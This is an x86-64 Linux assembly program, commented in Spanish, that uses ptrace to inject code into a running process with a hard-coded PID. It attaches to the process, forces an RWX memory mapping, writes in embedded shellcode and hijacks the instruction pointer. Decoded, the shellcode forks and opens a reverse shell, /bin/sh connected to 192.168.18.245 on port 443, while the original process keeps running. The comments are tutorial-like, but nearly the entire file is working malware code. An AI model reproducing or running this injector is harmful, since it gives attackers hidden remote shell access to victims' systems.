
section .data
shellcode:
    db 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48
    db 0x83, 0xf8, 0x00, 0x74, 0x11, 0x4c, 0x8d, 0x1d
    db 0xec, 0xff, 0xff, 0xff, 0x4d, 0x8b, 0xb3, 0xf8
    db 0x0f, 0x00, 0x00, 0x41, 0xff, 0xe6, 0xb8, 0x70
    db 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x29, 0x00
    db 0x00, 0x00, 0xbf, 0x02, 0x00, 0x00, 0x00, 0xbe
    db 0x01, 0x00, 0x00, 0x00, 0x48, 0x31, 0xd2, 0x0f
    db 0x05, 0x49, 0x89, 0xc0, 0xb8, 0x2a, 0x00, 0x00
    db 0x00, 0x4c, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x41
    db 0x51, 0x49, 0xba, 0x02, 0x00, 0x01, 0xbb, 0xc0
    db 0xa8, 0x12, 0xf5, 0x41, 0x52, 0x48, 0x89, 0xe6
    db 0xba, 0x10, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48
    db 0x31, 0xf6, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x4c
    db 0x89, 0xc7, 0x0f, 0x05, 0x48, 0xff, 0xc6, 0x48
    db 0x83, 0xfe, 0x03, 0x7c, 0xed, 0xb8, 0x3b, 0x00
    db 0x00, 0x00, 0x6a, 0x00, 0x49, 0xbc, 0x2f, 0x62
    db 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x41, 0x54
    db 0x48, 0x89, 0xe7, 0x6a, 0x00, 0x48, 0x89, 0xe6
    db 0x6a, 0x00, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xb8
    db 0x3c, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f
    db 0x05, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
sc_len equ $ - shellcode
    
section .bss
    regs resq 27  ; sizeof(user_regs_struct) en x86_64  (27x8 bytes)
    regs_ori resq 27
    regs_sys resq 27 


section .text
global _start
_start:

    ; PID
    mov r15, 5204


; 1 Attach y detención del proceso:

    ; PTRACE_ATTACH
    mov rax, 101
    mov rdi, 16          ; PTRACE_ATTACH (0x10)
    mov rsi, r15         ; PID
    xor rdx,rdx          ; addr
    xor r10, r10         ; data
    syscall


    ; WAIT4: 
        ; Cuando se hace PTRACE_ATTACH, el kernel envía SIGSTOP al proceso objetivo. 
        ; Es necesario llamar a wait4 para bloquear al tracer hasta que el proceso tracee  
        ; esté efectivamente detenido antes de poder manipularlo.

        mov rax, 61
        mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)
        sub rsp, 8
        mov rsi, rsp            ; &status
        xor rdx, rdx            ; options
        xor r10, r10            ; rusage
        syscall

; -----------------------------------------

; 2 Preservación del contexto de ejecución

    ; PTRACE_GETREGS
    mov rax, 101
    mov rdi, 12   ; PTRACE_GETREGS
    mov rsi, r15  ; PID
    xor rdx, rdx  ; addr
    lea r10, [rel regs] ; puntero al buffer donde se va almacenar la estructura de registros
    syscall
    
    ; En este punto, regs contiene:
    ; 0x00  r15
    ; 0x08  r14
    ; 0x10  r13
    ; 0x18  r12
    ; 0x20  rbp
    ; 0x28  rbx
    ; 0x30  r11
    ; 0x38  r10
    ; 0x40  r9
    ; 0x48  r8
    ; 0x50  rax
    ; 0x58  rcx
    ; 0x60  rdx
    ; 0x68  rsi
    ; 0x70  rdi
    ; 0x78  orig_rax
    ; 0x80  rip
    ; 0x88  cs
    ; 0x90  eflags
    ; 0x98  rsp
    ; 0xA0  ss
    ; 0xA8  fs_base
    ; 0xB0  gs_base
    ; 0xB8  ds
    ; 0xC0  es
    ; 0xC8  fs
    ; 0xD0  gs

    ; Copia de los registros originales del traceee en el buffer de backup
    lea rsi, [rel regs]       ; RSI se usa como puntero de origen y va avanzando
    lea rdi, [rel regs_ori]   ; RDI se usa como puntero destino y va avanzando

    mov rcx, 27               ; RCX se usa como contador y se va decrementando hasta 0
    cld                       ; DF=0 (dirección de copia ascendente)
    rep movsq                 ; mueve RCX qwords: [RSI] -> [RDI]

                    ; movsq copia un qword (8 bytes) desde la dirección apuntada por RSI hacia la dirección apuntada por RDI   
                    ; rep repite esa operación RCX veces

; -----------------------------------------


; 3 Inyección de la instrucción syscall (0x0f 0x05)


    mov r12, [regs+0x80]   ; Contenido del RIP del proceso tracee (dirección de la próxima instrucción a ejecutar)

    ; PTRACE_PEEKDATA (leer memoria) Se leen 8 bytes a partir de la dirección actual a la que apunta el RIP del proceso tracee
    mov rax, 101
    mov rdi, 2       ; PTRACE_PEEKDATA
    mov rsi, r15     ; PID
    mov rdx, r12     ; addr
    sub rsp, 8       ; 8 bytes
    mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)
    syscall 

    mov r11, [rsp] ; En r11 y en el tope del stack se encuentra el valor al que apunta RIP del tracee
    mov r13, r11 ; Backup del valor original
    and r11, 0xFFFFFFFFFFFF0000 ; limpiar los 2 bytes bajos
    or r11, 0x000000000000050F  ; insertar syscall (0x0f 0x05 en little-endian)

    ; PTRACE_POKEDATA (escribir en memoria)
    mov rax, 101
    mov rdi, 5     ; PTRACE_POKEDATA
    mov rsi, r15   ; PID
    mov rdx, r12   ; addr 
    mov r10, r11   ; valor de 8 bytes a escribir
    syscall


;Valor en registro/hex: 0x00007ffe6f9001b0

;Descomposición:
;  0x 00 00 7f fe 6f 90 01 b0
;     ▲                    ▲
;     │                    │
;    MSB                 LSB
;   (más significativo) (menos significativo)


;En memoria (little-endian, LSB primero):

;RIP → 0x7f7a85496687:  ┌────┐
;                       │ b0 │ ← Primer byte, primera instrucción
;      0x7f7a85496688:  ├────┤
;                       │ 01 │
;      0x7f7a85496689:  ├────┤
;                       │ 90 │
;      0x7f7a8549668a:  ├────┤
;                       │ 6f │
;      0x7f7a8549668b:  ├────┤
;                       │ fe │
;      0x7f7a8549668c:  ├────┤
;                       │ 7f │
;      0x7f7a8549668d:  ├────┤
;                       │ 00 │
;      0x7f7a8549668e:  ├────┤
;                       │ 00 │
;                       └────┘

; -----------------------------------------


; 4 Configuración de registros para MMAP


    ; MMAP

        mov qword [regs+0x50], 9       ; (RAX) Se sustituye todo el valor del registro       Número de syscall para mmap
        mov qword [regs+0x70],0        ; (RDI)       rdi = addr = 0 (NULL) → Pide al kernel que elija la dirección
        mov qword [regs+0x68],4096     ; (RSI)       rsi = length = 4096 bytes (1 página típica)
        mov qword [regs+0x60],7        ; (RDX)       rdx = prot = 7 => PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4)
        mov qword [regs+0x38],34       ; (R10)       r10 = flags = 34 => MAP_PRIVATE(0x2) | MAP_ANONYMOUS(0x20)
        mov qword [regs+0x48],-1       ; (R8)        r8 = fd = -1 (usado con MAP_ANONYMOUS; -1 indica "no file")
        mov qword [regs+0x40],0        ; (R9)        r9 = offset = 0 (desplazamiento en el fd; irrelevante con ANONYMOUS)
    
    ; PTRACE_SETREGS
        mov rax, 101
        mov rdi, 13    ; PTRACE_SETREGS
        mov rsi, r15   ; PID
        xor rdx, rdx   ; addr
        lea r10, [rel regs] ; puntero al buffer donde se encuentra la estructura de registros
        syscall


; -----------------------------------------


; 5 Ejecución controlada de la syscall MMAP

    ;PTRACE_SINGLESTEP
    mov rax, 101
    mov rdi, 9       ; PTRACE_SINGLESTEP
    mov rsi, r15     ; PID
    xor rdx, rdx     ; addr
    xor r10, r10     ; data
    syscall

    ; WAIT4: 
    mov rax, 61
    mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)
    sub rsp, 8
    mov rsi, rsp            ; &status
    xor rdx, rdx            ; options
    xor r10, r10            ; rusage
    syscall

    ; PTRACE_GETREGS
    mov rax, 101
    mov rdi, 12   ; PTRACE_GETREGS
    mov rsi, r15  ; PID
    xor rdx, rdx  ; addr
    lea r10, [rel regs_sys] ; puntero al buffer donde se va almacenar la estructura de registros
    syscall
    

; -----------------------------------------


; 6 Obtención del resultado de la syscall MMAP


    xor r12, r12 
    mov r12, [regs_sys+0x50]       ; (RAX) dirección donde comienza la zona de memoria reservada com permisos RWX


; -----------------------------------------

; 7 Restauración del contenido ubicado en la dirección a la que apunta el registro RIP del tracee

        xor r14, r14
        mov r14, [regs_ori+0x80]

        ; PTRACE_POKEDATA (escribir en memoria)
        mov rax, 101
        mov rdi, 5     ; PTRACE_POKEDATA
        mov rsi, r15   ; PID
        mov rdx, r14   ; addr 
        mov r10, r13   ; valor de 8 bytes a escribir
        syscall

        ; Comprobación de que se haya restaurado el bytearray de manera adecuada
        ; PTRACE_PEEKDATA (leer memoria)
        ;mov rax, 101
        ;mov rdi, 2       ; PTRACE_PEEKDATA
        ;mov rsi, r15     ; PID
        ;mov rdx, r14     ; addr
        ;sub rsp, 8
        ;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)
        ;syscall 

; -----------------------------------------


; 8 Restauración de los registros originales del proceso tracee



        ; PTRACE_SETREGS
        mov rax, 101
        mov rdi, 13    ; PTRACE_SETREGS
        mov rsi, r15   ; PID
        xor rdx, rdx   ; addr
        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros
        syscall



; -----------------------------------------

; 9 Almacenamiento del RIP de retorno en los últimos 8 bytes de la región de memoria reservada por MMAP


        ; PTRACE_POKEDATA (escribir en memoria)
        mov rax, 101
        mov rdi, 5     ; PTRACE_POKEDATA
        mov rsi, r15   ; PID
        lea rdx, [r12+4088]   ; addr 
        mov r10, r14   ; valor de 8 bytes a escribir
        syscall
        
        ; Verificar que se ha escrito el valor del RIP de retorno en la región de memoria reservada por MMAP
        
        ; PTRACE_PEEKDATA
        ;mov rax, 101
        ;mov rdi, 2       ; PTRACE_PEEKDATA
        ;mov rsi, r15     ; PID
        ;lea rdx, [r12+4088]     ; addr
        ;sub rsp, 8       ; 8 bytes
        ;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)
        ;syscall 
        


; -----------------------------------------

; 10 Inyección del shellcode en la zona de memoria reservada (PTRACE_POKEDATA escribe 8 bytes)

    xor r13,r13
    lea r13, [rel shellcode]   ; puntero al shellcode
    xor r14, r14
    mov r14, sc_len / 8        ; contador de palabras a escribir
    push r12

    .loop_inj:

        cmp r14, 0     ; compara el contador de palabras a escribir con 0
        jz .done       ; si contador == 0, saltar a .done

        ; PTRACE_POKEDATA
        mov rax, 101
        mov rdi, 5     ; PTRACE_POKEDATA
        mov rsi, r15   ; PID
        mov rdx, r12   ; addr 
        mov r10, [r13] ; valor de 8 bytes a escribir
        syscall

        add r12, 8
        add r13, 8
        dec r14
        jmp .loop_inj


; -----------------------------------------

    .done

        ; Verificar que el shellcode se escribió bien
        ;mov rax, 101
        ;mov rdi, 2          ; PTRACE_PEEKDATA
        ;mov rsi, r15
        ;mov rdx, r12        ; dirección mmap
        ;sub rsp, 8       ; 8 bytes
        ;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)
        ;syscall 

        pop r12

        mov qword [regs_ori+0x80], r12   ; RIP == dirección del inicio de la memoria reservada == inicio del shellcode
        mov qword [regs_ori+0x78], -1    ; orig_rax = -1 (evita syscall restart)


        ; PTRACE_SETREGS
        mov rax, 101
        mov rdi, 13    ; PTRACE_SETREGS
        mov rsi, r15   ; PID
        xor rdx, rdx   ; addr
        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros
        syscall



    ; PTRACE_DETACH
    mov rax, 101
    mov rdi, 17    ; PTRACE_DETACH
    mov rsi, r15   ; PID
    xor rdx, rdx   ; addr
    xor r10, r10   ; signal = 0 (no enviar señal)
    syscall


    ; EXIT
    mov rax, 60
    xor rdi,rdi 
    syscall



;Explicar fork, setsid y munmap